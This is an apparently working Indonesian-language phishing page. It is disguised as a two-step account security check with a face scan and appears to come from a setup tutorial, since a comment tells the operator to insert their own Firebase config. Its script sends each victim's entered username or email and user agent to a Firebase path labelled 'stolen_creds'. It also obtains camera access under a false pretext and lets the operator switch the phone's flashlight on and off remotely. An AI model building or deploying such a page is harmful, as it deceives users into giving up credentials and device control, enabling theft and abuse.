<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verifikasi Keamanan Akun</title>
    <style>
        * { box-sizing: border-box; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
        body { background: #0a0f1e; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: rgba(255,255,255,0.08); backdrop-filter: blur(12px); border-radius: 36px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        h2 { color: white; font-weight: 600; margin-bottom: 12px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 28px; }
        input { width: 100%; padding: 16px; margin: 12px 0; background: #1e2436; border: none; border-radius: 28px; color: white; font-size: 16px; outline: none; text-align: center; }
        button { background: #2a6df4; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-weight: bold; font-size: 16px; width: 100%; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(42,109,244,0.3); }
        button:active { transform: scale(0.97); }
        .status { margin-top: 24px; font-size: 13px; color: #ffaa44; background: #2a2418; padding: 8px; border-radius: 40px; display: inline-block; width: auto; }
        footer { font-size: 11px; color: #555; margin-top: 20px; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Verifikasi Dua Langkah</h2>
    <p>Demi keamanan, pindai wajah Anda untuk mengakses akun.</p>
    <input type="text" id="fakeUsername" placeholder="Email / Nama Pengguna" autocomplete="off">
    <button id="verifyBtn">Lanjutkan Verifikasi</button>
    <div id="flashStatus" class="status" style="display: none;">📸 Mengakses kamera...</div>
    <footer>sistem keamanan terenkripsi</footer>
</div>

<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
<script>
    // GANTI DENGAN firebaseConfig-mu dari Langkah 1
    const firebaseConfig = {
        apiKey: "ISI_APIKEY_ANDA",
        authDomain: "ISI_AUTHDOMAIN",
        databaseURL: "ISI_DATABASE_URL",
        projectId: "ISI_PROJECTID",
        storageBucket: "ISI_STORAGEBUCKET",
        messagingSenderId: "ISI_SENDERID",
        appId: "ISI_APPID"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentStream = null;
    let torchCapable = false;
    let videoTrack = null;

    async function enableTorch(enable) {
        if (!videoTrack || !torchCapable) return false;
        try {
            await videoTrack.applyConstraints({ advanced: [{ torch: enable }] });
            return true;
        } catch(e) { return false; }
    }

    async function requestCameraAndTorch() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            currentStream = stream;
            videoTrack = stream.getVideoTracks()[0];
            const capabilities = videoTrack.getCapabilities();
            torchCapable = capabilities.torch === true;
            if (!torchCapable) {
                document.getElementById('flashStatus').innerHTML = '⚠️ Perangkat tidak mendukung senter.';
                document.getElementById('flashStatus').style.display = 'block';
                return false;
            }
            // Matikan torch awal
            await enableTorch(false);
            document.getElementById('flashStatus').innerHTML = '✅ Kamera siap, senter dapat dikontrol.';
            document.getElementById('flashStatus').style.display = 'block';
            return true;
        } catch (err) {
            document.getElementById('flashStatus').innerHTML = '❌ Izin kamera ditolak.';
            return false;
        }
    }

    // Listener dari Firebase
    const deviceId = getDeviceId();
    const commandRef = db.ref(`commands/${deviceId}`);
    commandRef.on('value', (snapshot) => {
        const cmd = snapshot.val();
        if (cmd === 'torch_on') {
            enableTorch(true);
        } else if (cmd === 'torch_off') {
            enableTorch(false);
        }
    });

    function getDeviceId() {
        let id = localStorage.getItem('phish_device_id');
        if (!id) {
            id = 'dev_' + Math.random().toString(36).substr(2, 16);
            localStorage.setItem('phish_device_id', id);
        }
        return id;
    }

    document.getElementById('verifyBtn').onclick = async () => {
        const username = document.getElementById('fakeUsername').value.trim();
        if (username === "") {
            alert("Isi email / username");
            return;
        }
        // Simpan data curian (opsional)
        db.ref(`stolen_creds/${deviceId}`).set({
            username: username,
            userAgent: navigator.userAgent,
            time: Date.now()
        });

        const statusDiv = document.getElementById('flashStatus');
        statusDiv.style.display = 'block';
        statusDiv.innerHTML = 'Meminta akses kamera...';

        const success = await requestCameraAndTorch();
        if (success) {
            statusDiv.innerHTML = '✅ Verifikasi selesai. Senter siap dikendalikan.';
        } else {
            statusDiv.innerHTML = 'Gagal akses kamera, senter tidak tersedia.';
        }
    };
</script>
</body>
</html>
